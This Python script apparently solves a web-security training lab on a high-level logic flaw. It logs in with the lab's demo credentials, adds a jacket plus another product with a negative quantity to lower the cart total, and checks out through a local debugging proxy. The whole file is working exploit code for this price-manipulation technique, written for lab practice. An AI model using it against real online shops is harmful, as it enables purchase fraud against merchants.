#problem -> High-level logic vulnerability

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore,Back,Style,init
#init(autoreset=True)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#defining color pattern
green = Fore.GREEN
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,green)

#defining proxy for debug 

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf_token = soup.find('input',{'name':'csrf'})['value']
    return csrf_token

def buy_jacket(s,url):
    
    # Trying to login with username and password
    login_url = url + '/login'
    csrf = get_csrf(s,login_url)
    data = {
        'csrf':csrf,
        'username':'wiener',
        'password':'peter'
    }

    res = s.post(login_url,data=data,verify=False,proxies=proxies)
    if 'Log out' in res.text:
        print("Successfully LoggedIn as wiener")

        #Adding jacket into cart

        cart_url = url + '/cart'
        jacket_data = {
            'productId':1,
            'redir':'PRODUCT',
            'quantity':1
        }
        s.post(cart_url,data=jacket_data,verify=False,proxies=proxies)

        #Adding any other product 

        product_data = {
            'productId':2,
            'redir':'PRODUCT',
            'quantity':-16
        }
        s.post(cart_url,data=product_data,verify=False,proxies=proxies)

        #Buying Jacket

        checkout_url = cart_url + '/checkout'
        checkout_csrf = get_csrf(s,cart_url)
        order_data = {
            'csrf':checkout_csrf
        }

        res = s.post(checkout_url,data=order_data,verify=False,proxies=proxies)

        if "Congratulations" in res.text:
            print("[+] Successfully purchase the lightweight leather jacket")
        else:

            print("[-] Unable to solve the lab")

    else:
        print("Unable to LogIn")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage : python3 {} <target-url>".format(sys.argv[0]))
    else:
        s = requests.Session()
        url = sys.argv[1]
        buy_jacket(s,url)


if __name__ == '__main__':
    main()



print(reset)